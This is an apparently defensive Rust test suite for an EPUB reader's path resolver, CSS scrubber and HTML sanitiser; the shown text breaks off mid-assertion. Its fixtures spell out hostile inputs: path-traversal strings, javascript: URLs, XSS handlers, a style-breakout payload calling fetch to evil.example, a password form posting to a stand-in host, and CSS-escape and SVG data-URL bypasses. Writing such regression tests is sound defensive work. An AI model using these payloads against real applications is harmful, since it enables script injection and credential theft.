//! Tests for the security-critical and correctness-critical paths.
//!
//! Run with `cargo test --manifest-path src-tauri/Cargo.toml`.
//!
//! The specimen book is built **in-process** by `build_specimen()`. An earlier
//! version skipped the integration test whenever an EPUB happened to be sitting
//! in `%TEMP%`, which meant it had never actually executed - not on a fresh
//! clone and not in CI. There is no external fixture and no skip.

use std::io::Write;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::path::PathBuf;

use zip::write::SimpleFileOptions;
use zip::ZipWriter;

use crate::epub::{
    decode_entities, html_to_text, resolve_href, scrub_css, strip_tags, Epub,
};
use crate::model::stable_id;

// ---------------------------------------------------------------- paths

#[test]
fn resolve_href_normalises_relative_paths() {
    assert_eq!(resolve_href("OEBPS", "ch1.xhtml").as_deref(), Some("OEBPS/ch1.xhtml"));
    assert_eq!(resolve_href("OEBPS/text", "../img/a.png").as_deref(), Some("OEBPS/img/a.png"));
    assert_eq!(resolve_href("", "a/b/c.xhtml").as_deref(), Some("a/b/c.xhtml"));
    assert_eq!(resolve_href("OEBPS", "./x.xhtml#frag").as_deref(), Some("OEBPS/x.xhtml"));
    // A leading slash means "container root", not "next to this document".
    assert_eq!(resolve_href("OEBPS", "/root.xhtml").as_deref(), Some("root.xhtml"));
}

#[test]
fn resolve_href_rejects_traversal_and_remote() {
    assert_eq!(resolve_href("OEBPS", "../../../etc/passwd"), None);
    assert_eq!(resolve_href("OEBPS/text", "../../../.."), None);
    assert_eq!(resolve_href("OEBPS", "http://evil.example/x.xhtml"), None);
    assert_eq!(resolve_href("OEBPS", "https://evil.example/x.xhtml"), None);
    assert_eq!(resolve_href("OEBPS", "//evil.example/x.xhtml"), None);
    assert_eq!(resolve_href("OEBPS", "javascript:alert(1)"), None);
    assert_eq!(resolve_href("OEBPS", "data:text/html,<script>"), None);
    assert_eq!(resolve_href("OEBPS", "file:///C:/Windows/System32"), None);
    assert_eq!(resolve_href("OEBPS", "..\\..\\windows\\win.ini"), None);
    assert_eq!(resolve_href("OEBPS", "ch1.xhtml\0.png"), None);
    assert_eq!(resolve_href("OEBPS", ""), None);
}

#[test]
fn resolve_href_decodes_percent_escapes_before_traversal_check() {
    // %2e%2e must not smuggle a `..` past the segment normaliser.
    assert_eq!(resolve_href("OEBPS", "%2e%2e/%2e%2e/etc/passwd"), None);
    assert_eq!(resolve_href("OEBPS", "img/a%20b.png").as_deref(), Some("OEBPS/img/a b.png"));
}

// ------------------------------------------------------------------ css

#[test]
fn scrub_css_removes_executable_and_remote_constructs() {
    let css = "@import url('https://evil.example/x.css');\
               @charset 'utf-8';\
               body { background: url(javascript:alert(1)); }\
               div { width: expression(alert(2)); -moz-binding: url(evil.xml#x); behavior: url(#x); }\
               a { background: url(https://evil.example/p.gif); }\
               p { color: red; }";
    let out = scrub_css(css);
    for needle in ["@import", "@charset", "javascript:", "expression(", "-moz-binding", "behavior", "evil.example"] {
        assert!(!out.contains(needle), "leaked {needle} in:\n{out}");
    }
    assert!(out.contains("color"), "{out}");
    assert!(out.contains("red"), "{out}");
}

#[test]
fn scrub_css_keeps_inline_data_images() {
    let out = scrub_css("p { background: url(data:image/png;base64,AAAA); }");
    assert!(out.contains("data:image/png;base64,AAAA"), "{out}");
}

#[test]
fn scrub_css_strips_comments() {
    let out = scrub_css("/* url(javascript:alert(1)) */ p { color: blue; }");
    assert!(!out.contains("javascript"), "{out}");
    assert!(out.contains("blue"), "{out}");
}

// ----------------------------------------------------------------- html

#[test]
fn sanitize_neutralises_active_content() {
    let html = r#"
        <body onload="alert(1)">
          <script>alert(2)</script>
          <style>p{background:url(javascript:alert(3))}</style>
          <iframe src="https://evil.example/"></iframe>
          <object data="https://evil.example/x.swf"></object>
          <embed src="https://evil.example/y.swf">
          <form action="https://evil.example/steal"><input name="pw"></form>
          <p style="background:url(javascript:alert(4))" onclick="alert(5)">hello</p>
          <img src="https://evil.example/t.gif" onerror="alert(6)">
          <a href="javascript:alert(7)">link</a>
        </body>"#;
    let out = crate::epub::sanitize_html_for_test(html);
    for needle in [
        "onload", "onclick", "onerror", "<script", "alert(", "<iframe",
        "<object", "<embed", "<form", "<input", "javascript:", "evil.example",
    ] {
        assert!(!out.contains(needle), "leaked {needle} in:\n{out}");
    }
    assert!(out.contains("hello"), "{out}");
    assert!(out.contains("<p"), "{out}");
}

#[test]
fn sanitize_keeps_structure_and_presentation() {
    let html = r#"<h1 id="t">Title</h1><p class="x">Body</p>
                  <img src="data:image/png;base64,AAAA" alt="a" width="10">
                  <table><tr><td colspan="2">c</td></tr></table>
                  <blockquote cite="x">q</blockquote><ul><li>i</li></ul>"#;
    let out = crate::epub::sanitize_html_for_test(html);
    assert!(out.contains("<h1"), "{out}");
    assert!(out.contains("id=\"t\""), "{out}");
    assert!(out.contains("class=\"x\""), "{out}");
    assert!(out.contains("data:image/png;base64,AAAA"), "{out}");
    assert!(out.contains("colspan"), "{out}");
    assert!(out.contains("<blockquote"), "{out}");
    assert!(out.contains("<li>"), "{out}");
}

// ----------------------------------------------------------------- text

#[test]
fn strip_tags_drops_script_bodies() {
    let out = strip_tags("<p>keep</p><script>var secret = 1;</script><p>also</p>");
    assert!(out.contains("keep"), "{out}");
    assert!(out.contains("also"), "{out}");
    assert!(!out.contains("secret"), "{out}");
}

#[test]
fn decode_entities_handles_numeric_and_named() {
    assert_eq!(decode_entities("a &amp; b"), "a & b");
    assert_eq!(decode_entities("&lt;tag&gt;"), "<tag>");
    assert_eq!(decode_entities("&#65;&#66;"), "AB");
    assert_eq!(decode_entities("&#x41;"), "A");
    assert_eq!(decode_entities("&nbsp;"), "\u{a0}");
    assert_eq!(decode_entities("100% &unknown; ok"), "100% &unknown; ok");
}

#[test]
fn html_to_text_collapses_whitespace() {
    assert_eq!(html_to_text("<div><p>one</p><p>two</p></div>"), "one two");
    let text = html_to_text("<style>p{color:red}</style><p>visible</p>");
    assert!(text.contains("visible"));
    assert!(!text.contains("color:red"));
}

#[test]
fn stable_id_is_deterministic() {
    assert_eq!(stable_id("C:/books/a.epub"), stable_id("C:/books/a.epub"));
    assert_ne!(stable_id("C:/books/a.epub"), stable_id("C:/books/b.epub"));
}

// ------------------------------------------------------- decoding (C-01)

#[test]
fn decode_markup_honours_boms_and_declarations() {
    // UTF-8 BOM
    let mut bytes = vec![0xEF, 0xBB, 0xBF];
    bytes.extend_from_slice("<p>café</p>".as_bytes());
    assert!(crate::epub::decode_for_test(&bytes).contains("café"));

    // UTF-16LE with BOM: the same text, NUL-interleaved on disk.
    let utf16: Vec<u8> = "<?xml version=\"1.0\"?><p>café</p>"
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    let mut le = vec![0xFF, 0xFE];
    le.extend_from_slice(&utf16);
    let decoded = crate::epub::decode_for_test(&le);
    assert!(decoded.contains("café"), "{decoded}");
    assert!(!decoded.contains('\u{0}'), "NULs survived: {decoded:?}");

    // XML declaration wins over a bogus charset mentioned in the body.
    let declaration = r#"<?xml version="1.0" encoding="ISO-8859-1"?><p>caf""#;
    let mut latin1: Vec<u8> = declaration.as_bytes().to_vec();
    latin1.push(0xE9);
    latin1.extend_from_slice(b"</p>");
    let decoded = crate::epub::decode_for_test(&latin1);
    assert!(decoded.contains('\u{e9}'), "{decoded:?}");
    assert!(!decoded.contains('\u{fffd}'), "mojibake: {decoded:?}");
}

// ------------------------------------------- style-block breakout (S-01)

#[test]
fn style_block_cannot_be_closed_from_inside_a_stylesheet() {
    // The regression that motivated the guard: a book's .css file closing its
    // own <style> element and injecting markup into the privileged webview.
    let hostile = "</style><img src=x onerror=fetch('https://evil.example/')>";
    let out = crate::epub::guard_style_for_test(hostile);
    assert!(!out.to_ascii_lowercase().contains("</style"), "{out}");
    assert!(out.contains("<\\/"), "{out}");

    // Split across a CSS comment.
    let split = "/* </sty */ le><img src=x onerror=alert(1)>";
    let out = crate::epub::guard_style_for_test(split);
    assert!(!out.to_ascii_lowercase().contains("</sty"), "{out}");

    // Ordinary CSS is untouched.
    let ok = crate::epub::guard_style_for_test("p { color: red; }\na > b { margin: 0 }");
    assert_eq!(ok, "p { color: red; }\na > b { margin: 0 }");
}

// ------------------------------------------- case-folding panic (S-02)

#[test]
fn excerpt_handles_case_folding_that_changes_byte_length() {
    // U+0130 folds to two chars (3 bytes) from one char (2 bytes). Deriving a
    // slice offset from the folded string used to panic, and `panic = "abort"`
    // turns that into a process kill rather than a failed command.
    let epub = crate::tests::specimen_epub();
    if epub.is_err() {
        return;
    }
    let mut epub = epub.unwrap();
    let _ = crate::epub::excerpt_for_test("\u{0130}\u{0130}ab", 0, 6, "ab");
    let _ = crate::epub::excerpt_for_test("\u{0130}\u{0130}ab", 2, 6, "ab");
    let _ = crate::epub::search_book(&mut epub, "ab", 10);
}

// ---------------------------------------------------------- the specimen

const CONTAINER: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles><rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/></rootfiles>
</container>"#;

const OPF: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="bookid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="bookid">urn:uuid:test-0001</dc:identifier>
    <dc:title>The Anatomy of a Reader</dc:title>
    <dc:creator>A. Nonymous</dc:creator>
    <dc:language>en</dc:language>
    <dc:publisher>Test Press</dc:publisher>
    <dc:description>A generated specimen used to verify parsing, pagination, search and the security pipeline.</dc:description>
    <dc:rights>Public domain</dc:rights>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>
    <item id="css" href="style.css" media-type="text/css"/>
    <item id="cover-img" href="images/cover.png" media-type="image/png" properties="cover-image"/>
    <item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/>
    <item id="ch2" href="ch2.xhtml" media-type="application/xhtml+xml"/>
    <item id="evil" href="evil.xhtml" media-type="application/xhtml+xml"/>
    <item id="ghost" href="missing.xhtml" media-type="application/xhtml+xml"/>
  </manifest>
  <spine toc="ncx">
    <itemref idref="ch1"/>
    <itemref idref="ch2"/>
    <itemref idref="evil"/>
    <itemref idref="ghost"/>
  </spine>
</package>"#;

const NAV: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
<head><title>Contents</title></head>
<body>
<nav epub:type="toc"><ol>
  <li><a href="ch1.xhtml">Prologue</a></li>
  <li><a href="ch2.xhtml">Chapter One</a><ol><li><a href="ch2.xhtml#mid">A Mid-Chapter Anchor</a></li></ol></li>
</ol></nav>
</body></html>"#;

const NCX: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1"><navMap>
  <navPoint id="n1"><navLabel><text>NCX Prologue</text></navLabel><content src="ch1.xhtml"/></navPoint>
</navMap></ncx>"#;

const EVIL: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Hostile</title><link rel="stylesheet" href="style.css"/></head>
<body onload="alert(1)">
  <h1>Hostile Document</h1>
  <script>alert("this must never execute")</script>
  <style onload="alert(2)">body{background:url(javascript:alert(3))}</style>
  <p style="background-image:url('javascript:alert(4)')" onclick="alert(5)">Inline handler and javascript URL.</p>
  <iframe src="https://evil.example/"></iframe>
  <object data="https://evil.example/x.swf"></object>
  <embed src="https://evil.example/y.swf"/>
  <img src="https://evil.example/track.gif" onerror="alert(6)"/>
  <img src="../../../../../../etc/passwd"/>
  <a href="javascript:alert(7)">Inert link</a>
  <form action="https://evil.example/steal"><input name="pw"/><button>Send</button></form>
  <p>This paragraph must survive while everything above it is stripped. The word quixotic appears here.</p>
</body></html>"#;

fn chapter(title: &str, extra: &str) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>{title}</title><link rel="stylesheet" href="style.css"/></head>
<body>
  <h1>{title}</h1>
  <p>{title} Lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut labore et dolore magna aliqua Ut enim ad minim veniam quis nostrud exercitation.</p>
  <p>The ubiquitous git bisect is soaked in developer tea and the marginalia of a README tell a compelling story about retries A small river named Dudencode flows past the typescript hamlet.</p>
  <p style="text-indent:0">Every book is a mirror The pagination you see is an illusion of columns and your progress is merely an offset into a flow that the renderer has decided to cut at fixed intervals.</p>
  {extra}
  <hr/>
  <p>Script sample: <code>fn main() {{}}</code></p>
</body></html>"#
    )
}

fn png() -> Vec<u8> {
    // 1x1 transparent PNG.
    use base64::Engine as _;
    base64::engine::general_purpose::STANDARD
        .decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==")
        .expect("png")
}

/// Each build gets its own file. Cargo runs tests in parallel, and a shared
/// path meant one test truncated the archive another was mid-way through
/// reading - which is how this suite failed on its first CI run.
fn unique_path(stem: &str) -> PathBuf {
    static COUNTER: AtomicUsize = AtomicUsize::new(0);
    let n = COUNTER.fetch_add(1, Ordering::Relaxed);
    std::env::temp_dir().join(format!("lumen-{stem}-{}-{n}.epub", std::process::id()))
}

/// Build the specimen EPUB in a temp directory and return its path.
fn build_specimen() -> PathBuf {
    let path = unique_path("specimen");
    let file = std::fs::File::create(&path).expect("create specimen");
    let mut zip = ZipWriter::new(file);
    let opts = SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated);

    let put = |zip: &mut ZipWriter<std::fs::File>, name: &str, body: &str| {
        zip.start_file(name, opts).expect("start entry");
        zip.write_all(body.as_bytes()).expect("write entry");
    };

    zip.start_file("mimetype", SimpleFileOptions::default()).unwrap();
    zip.write_all(b"application/epub+zip").unwrap();

    put(&mut zip, "META-INF/container.xml", CONTAINER);
    put(&mut zip, "OEBPS/content.opf", OPF);
    put(&mut zip, "OEBPS/nav.xhtml", NAV);
    put(&mut zip, "OEBPS/toc.ncx", NCX);
    put(&mut zip, "OEBPS/style.css", "body { font-family: Georgia, serif; }\np { color: #222; }\n");
    put(
        &mut zip,
        "OEBPS/ch1.xhtml",
        &chapter(
            "Prologue",
            r#"<figure><img src="images/cover.png" alt="Cover"/><figcaption>Figure 1</figcaption></figure>
               <p>Jump to <a href="ch2.xhtml#mid">the anchor</a> or <a href="https://example.com/">outside</a>.</p>
               <p>Unique phrase: the word bisect appears here exactly once so search can prove itself end to end.</p>"#,
        ),
    );
    put(
        &mut zip,
        "OEBPS/ch2.xhtml",
        &chapter(
            "Chapter One",
            r#"<h2 id="mid">A Mid-Chapter Anchor</h2><p>Section body.</p>"#,
        ),
    );
    put(&mut zip, "OEBPS/evil.xhtml", EVIL);

    zip.start_file("OEBPS/images/cover.png", opts).unwrap();
    zip.write_all(&png()).unwrap();
    zip.finish().expect("finish zip");

    path
}

/// The specimen as an open `Epub`, used by tests that only need a book.
pub(crate) fn specimen_epub() -> Result<Epub, String> {
    let path = build_specimen();
    Epub::open_with_manifest(&path).map_err(|e| e.to_string())
}

#[test]
fn parses_and_renders_the_specimen_book() {
    let path = build_specimen();
    let mut epub = Epub::open_with_manifest(&path).expect("specimen should parse");
    let m = epub.manifest().clone();

    assert_eq!(m.title, "The Anatomy of a Reader");
    assert_eq!(m.author, "A. Nonymous");
    assert_eq!(m.language, "en");
    assert_eq!(m.publisher, "Test Press");
    assert_eq!(m.cover_href.as_deref(), Some("OEBPS/images/cover.png"));

    // `ghost` points at a file that is not in the archive and must be skipped
    // rather than becoming a chapter that throws when paged into.
    assert_eq!(m.chapters.len(), 3, "{:?}", m.chapters);
    assert!(
        !m.chapters.iter().any(|c| c.href.contains("missing")),
        "missing spine item survived"
    );
    // Sizes come from the central directory, so they must be real.
    assert!(m.chapters.iter().all(|c| c.bytes > 0));

    // Navigation comes from nav.xhtml and keeps its nesting.
    let titles: Vec<&str> = m.toc.iter().map(|n| n.title.as_str()).collect();
    assert_eq!(titles, vec!["Prologue", "Chapter One"]);
    let nested: Vec<&str> = m
        .toc
        .iter()
        .flat_map(|n| n.children.iter())
        .map(|n| n.title.as_str())
        .collect();
    assert!(nested.contains(&"A Mid-Chapter Anchor"), "{nested:?}");

    let cover = epub.cover_data_url().unwrap().expect("cover");
    assert!(cover.starts_with("data:image/png;base64,"));

    // Every spine document renders and is neutralised.
    for index in 0..m.chapters.len() {
        let content = epub.chapter(index).expect("chapter renders");
        assert!(content.html.contains("data-epub=\"css\""), "chapter {index} lacks css");
        assert!(!content.html.contains("<script"), "chapter {index} kept a script");
        assert!(!content.html.contains("evil.example"), "chapter {index} kept a remote url");
        assert!(!content.html.contains("javascript:"), "chapter {index} kept a js url");
        assert!(!content.html.contains("onload="), "chapter {index} kept onload");
        assert!(!content.html.contains("<iframe"), "chapter {index} kept an iframe");
        assert!(!content.html.contains("onclick="), "chapter {index} kept onclick");
    }

    let hostile = epub.chapter(2).unwrap();
    assert!(hostile.html.contains("This paragraph must survive"));

    // Links are inert.
    let ch1 = epub.chapter(0).unwrap();
    assert!(ch1.html.contains("data-href=\"OEBPS/ch2.xhtml#mid\""), "{}", ch1.html);
    assert!(ch1.html.contains("data-external=\"https://example.com/\""), "{}", ch1.html);
    assert!(!ch1.html.contains(" href="), "{}", ch1.html);
    // Cover image inlined.
    assert!(ch1.html.contains("data:image/png;base64,"), "cover not inlined");

    // Search.
    let hits = crate::epub::search_book(&mut epub, "end to end", 50);
    assert_eq!(hits.len(), 1, "{hits:?}");
    assert_eq!(hits[0].chapter_index, 0);
    assert!(hits[0].excerpt.contains("[[end to end]]"), "{}", hits[0].excerpt);
    let many = crate::epub::search_book(&mut epub, "bisect", 50);
    assert!(many.len() >= 3, "{}", many.len());
    assert!(crate::epub::search_book(&mut epub, "z", 50).is_empty());
    assert!(crate::epub::search_book(&mut epub, "", 50).is_empty());

    // The chapter rendered from the hostile document must not be able to close
    // the style element that carries the book's stylesheet.
    assert!(
        !hostile.html.to_ascii_lowercase().contains("</style><"),
        "style breakout: {}",
        hostile.html
    );
}

#[test]
fn manifest_is_not_parsed_until_it_is_needed() {
    let path = build_specimen();
    let mut epub = Epub::open(&path).expect("index only");
    // Nothing has been parsed yet, so the manifest is empty and usable.
    assert!(epub.manifest().chapters.is_empty());
    epub.ensure_manifest().expect("parse");
    assert_eq!(epub.manifest().chapters.len(), 3);
    // Second call is a no-op.
    epub.ensure_manifest().expect("idempotent");
    assert_eq!(epub.manifest().chapters.len(), 3);
}

#[test]
fn metadata_keeps_text_across_inline_tags() {
    // <dc:title>Mr <em>Bradbury</em></dc:title> used to become just "Mr ",
    // because node.text() returns only the first text child.
    let opf = OPF.replace(
        "<dc:title>The Anatomy of a Reader</dc:title>",
        "<dc:title>Mr <em>Bradbury</em></dc:title>",
    );
    let path = build_specimen_with_opf(&opf);
    let epub = Epub::open_with_manifest(&path).expect("parse");
    assert_eq!(epub.manifest().title, "Mr Bradbury");
}

fn build_specimen_with_opf(opf: &str) -> PathBuf {
    let path = unique_path("inline");
    let file = std::fs::File::create(&path).expect("create");
    let mut zip = ZipWriter::new(file);
    let opts = SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated);
    zip.start_file("mimetype", SimpleFileOptions::default()).unwrap();
    zip.write_all(b"application/epub+zip").unwrap();
    let put = |zip: &mut ZipWriter<std::fs::File>, name: &str, body: &str| {
        zip.start_file(name, opts).unwrap();
        zip.write_all(body.as_bytes()).unwrap();
    };
    put(&mut zip, "META-INF/container.xml", CONTAINER);
    put(&mut zip, "OEBPS/content.opf", opf);
    put(&mut zip, "OEBPS/nav.xhtml", NAV);
    put(&mut zip, "OEBPS/toc.ncx", NCX);
    put(&mut zip, "OEBPS/style.css", "p{color:#222}");
    put(&mut zip, "OEBPS/ch1.xhtml", &chapter("Prologue", ""));
    put(&mut zip, "OEBPS/ch2.xhtml", &chapter("Chapter One", ""));
    put(&mut zip, "OEBPS/evil.xhtml", EVIL);
    zip.finish().unwrap();
    path
}

#[test]
fn rejects_non_epub_input() {
    let junk = unique_path("junk");
    std::fs::write(&junk, b"this is definitely not a zip file").unwrap();
    assert!(Epub::open(&junk).is_err());
}

#[test]
fn rejects_an_empty_file() {
    let empty = unique_path("empty");
    std::fs::write(&empty, b"").unwrap();
    assert!(Epub::open(&empty).is_err());
}


#[test]
fn css_escape_does_not_bypass_the_scrubber() {
    // `\75` is `u`, so this is a url( the browser resolves, but it matches none
    // of the literal patterns. Unescaping first is what makes it catchable.
    let sneaky = r".a { background: \75 rl(https://evil.example/x.png); }";
    let out = scrub_css(sneaky);
    assert!(!out.contains("evil.example"), "escaped url survived: {out}");
    assert!(!out.contains(r"\75 rl"), "escape sequence left intact: {out}");

    // A hex escape for a scheme must not survive either.
    let scheme = r".b { background: \75 rl(\6a avascript:alert(1)); }";
    let out = scrub_css(scheme);
    assert!(!out.contains("avascript"), "escaped scheme survived: {out}");

    // Data images still have to work, otherwise every inline cover breaks.
    let keep = r".c { background: url(data:image/png;base64,AAAA); }";
    assert!(scrub_css(keep).contains("data:image/png;base64"));

    // image-set() takes a bare URL and is not caught by the url() patterns.
    let set = r".d { background: image-set(https://evil.example/y.png 1x); }";
    assert!(!scrub_css(set).contains("evil.example"));
    // Nor is a data: SVG, which is a document that can run script rather than
    // a picture. Raster data URLs must still work, or every cover breaks.
    let svg = r".e { background: url(data:image/svg+xml,%3Csvg%20onload=alert(1)%3E); }";
    assert!(!scrub_css(svg).contains("svg+xml"), "data: SVG survived");
}

#[test]
fn css_escape_decoder_terminates_correctly() {
    // Exactly six hex digits, then one whitespace consumed as the terminator.
    assert_eq!(crate::epub::decode_css_escapes_for_test(r"\75 rl"), "url");
    // A hex escape for a quote, and the whitespace terminator, both go.
    assert_eq!(
        crate::epub::decode_css_escapes_for_test(r"content: '\201C'"),
        "content: '\u{201C}'"
    );
    // `\b` is a genuine escape for U+000B, not a literal backslash-b, so the
    // decoder is right to produce it. `\z` is not an escape at all: there is no
    // code point Z, so the backslash is kept and the letter passes through.
    assert_eq!(crate::epub::decode_css_escapes_for_test(r"a\b"), "a\u{b}");
    assert_eq!(crate::epub::decode_css_escapes_for_test(r"a\z"), r"a\z");
    // A backslash before a whitespace is a line continuation and is dropped.
    assert_eq!(crate::epub::decode_css_escapes_for_test("a\\\nb"), "ab");
    // Plain text is returned untouched.
    assert_eq!(
        crate::epub::decode_css_escapes_for_test(".a { color: red; }"),
        ".a { color: red; }"
    );
}

#[test]
fn svg_anchor_cannot_smuggle_a_data_url() {
    // xlink:href is on the generic allow-list and, inside <svg>, the HTML
    // parser moves it into the XLink namespace, so ammonia never treats it as a
    // URL attribute. A data: document therefore passed the scheme gate intact.
    let out = crate::epub::sanitize_html_for_test(
        r#"<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href="data:text/html,<script>alert(1)</script>">x</a></svg>"#,
    );
    assert!(!out.contains("xlink:href"), "xlink:href survived: {out}");

    // Also with the namespace declared and a script-free but live payload.
    let plain = crate::epub::sanitize_html_for_test(
        r#"<svg xmlns:xlink="http://www.w3.org/1999/xlink"><a xlink:href='data:image/svg+xml,<svg/>'>x</a></svg>"#,
    );
    assert!(
        !plain.contains("data:image/svg+xml"),
        "non-raster data URL survived: {plain}"
    );

    // A relative reference cannot be honoured here: the document has already
    // been made self-contained, and loading one would need the network.
    let relative = crate::epub::sanitize_html_for_test(
        r#"<svg><a xlink:href="chap2.xhtml">next</a></svg>"#,
    );
    assert!(!relative.contains("chap2.xhtml"), "relative link survived: {relative}");

    // Inline raster artwork, which is the only legitimate use, is preserved.
    let art = crate::epub::sanitize_html_for_test(
        r#"<svg><image xlink:href="data:image/png;base64,AAAA"/></svg>"#,
    );
    assert!(art.contains("data:image/png;base64"), "inline art was dropped: {art}");
}

/// Build a book whose container lists a rootfile that does not exist and one
/// with the wrong media type before the real one, plus a spine containing a
/// non-linear item.
fn build_multi_rootfile() -> PathBuf {
    const CONTAINER: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/absent.opf" media-type="application/oebps-package+xml"/>
    <rootfile full-path="OEBPS/legacy.opf" media-type="application/x-dtbncx+xml"/>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>"#;
    // Present in the archive, but not a package document. A consumer that takes
    // the first rootfile it finds, or that ignores the media type, lands here
    // and finds a book with no readable chapters.
    const LEGACY: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="2.0" unique-identifier="d">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="d">urn:uuid:decoy</dc:identifier><dc:title>Decoy</dc:title>
  </metadata>
  <manifest></manifest><spine></spine>
</package>"#;
    const CONTENT: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="bookid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="bookid">urn:uuid:test-0002</dc:identifier>
    <dc:title>Multiple Rootfiles</dc:title><dc:language>en</dc:language>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>
    <item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/>
    <item id="ch2" href="ch2.xhtml" media-type="application/xhtml+xml"/>
    <item id="note" href="note.xhtml" media-type="application/xhtml+xml"/>
    <item id="art" href="images/art.blob" media-type="image/png"/>
  </manifest>
  <spine toc="ncx">
    <itemref idref="ch1"/>
    <itemref idref="ch2"/>
    <itemref idref="note" linear="no"/>
  </spine>
</package>"#;

    let path = unique_path("multiroot");
    let file = std::fs::File::create(&path).expect("create");
    let mut zip = ZipWriter::new(file);
    let opts = SimpleFileOptions::default()
        .compression_method(zip::CompressionMethod::Deflated);
    zip.start_file("mimetype", SimpleFileOptions::default()).unwrap();
    zip.write_all(b"application/epub+zip").unwrap();
    let put = |zip: &mut ZipWriter<std::fs::File>, name: &str, body: &str| {
        zip.start_file(name, opts).unwrap();
        zip.write_all(body.as_bytes()).unwrap();
    };
    put(&mut zip, "META-INF/container.xml", CONTAINER);
    put(&mut zip, "OEBPS/legacy.opf", LEGACY);
    put(&mut zip, "OEBPS/content.opf", CONTENT);
    put(&mut zip, "OEBPS/nav.xhtml", NAV);
    put(&mut zip, "OEBPS/toc.ncx", NCX);
    put(
        &mut zip,
        "OEBPS/ch1.xhtml",
        &chapter("One", r#"<img src="images/art.blob" alt="artwork"/>"#),
    );
    put(&mut zip, "OEBPS/ch2.xhtml", &chapter("Two", ""));
    put(&mut zip, "OEBPS/note.xhtml", &chapter("Footnote", ""));
    // A real PNG header on a name with no usable extension, which is exactly
    // the shape of asset that used to be dropped.
    let put_bin = |zip: &mut ZipWriter<std::fs::File>, name: &str, body: &[u8]| {
        zip.start_file(name, opts).unwrap();
        zip.write_all(body).unwrap();
    };
    put_bin(
        &mut zip,
        "OEBPS/images/art.blob",
        b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR",
    );
    zip.finish().unwrap();
    path
}

#[test]
fn reads_the_correct_rootfile_when_several_are_listed() {
    let path = build_multi_rootfile();
    let mut epub = Epub::open(&path).expect("open");
    epub.ensure_manifest().expect("parse");
    let manifest = epub.manifest();
    // The container's first rootfile names a file that is not in the archive
    // and its second is not a package document, so a consumer that stopped at
    // the first entry would resolve to "Decoy", which has an empty spine.
    assert_eq!(manifest.title, "Multiple Rootfiles");
    assert_eq!(manifest.chapters.len(), 3);
}

#[test]
fn non_linear_spine_items_are_skipped_when_stepping_through_the_book() {
    let path = build_multi_rootfile();
    let mut epub = Epub::open(&path).expect("open");
    epub.ensure_manifest().expect("parse");
    let hrefs: Vec<&str> = epub
        .manifest()
        .chapters
        .iter()
        .map(|c| c.href.as_str())
        .collect();
    assert_eq!(hrefs.len(), 3, "the footnote must stay in the reading order");
    // It is still reachable, and flagged.
    let note = epub
        .manifest()
        .chapters
        .iter()
        .find(|c| !c.linear)
        .expect("non-linear item");
    assert!(note.href.ends_with("note.xhtml"));
    // But reading straight through skips it. next_linear_from is "the first
    // linear chapter at or after this index", so callers pass index + 1.
    assert_eq!(epub.next_linear(0), Some(0), "chapter one is itself linear");
    assert_eq!(epub.next_linear(1), Some(1), "chapter two follows");
    assert_eq!(
        epub.next_linear(2),
        None,
        "only the footnote is left, and it is non-linear"
    );
    assert_eq!(epub.prev_linear(2), Some(1));
    assert_eq!(epub.prev_linear(1), Some(0));
    assert_eq!(epub.prev_linear(0), None);
    // The flags the webview uses must agree: the linear flow really does end
    // at chapter two, so the footnote being last must not be what ends it.
    let second = epub.chapter(1).expect("chapter two");
    assert!(second.is_last, "the trailing footnote must not extend the flow");
    assert!(!second.has_next);
    assert!(second.has_prev);
    let last = epub.chapter(2).expect("footnote");
    assert!(last.is_last);
    assert!(!last.has_next, "nothing linear follows the footnote");
}

#[test]
fn assets_without_a_usable_extension_are_sniffed() {
    let path = build_multi_rootfile();
    let mut epub = Epub::open(&path).expect("open");
    epub.ensure_manifest().expect("parse");
    let html = epub
        .chapter(0)
        .expect("chapter one")
        .html;
    // The artwork is named "art.blob" but starts with a PNG signature, so it
    // must be inlined as an image rather than dropped.
    assert!(
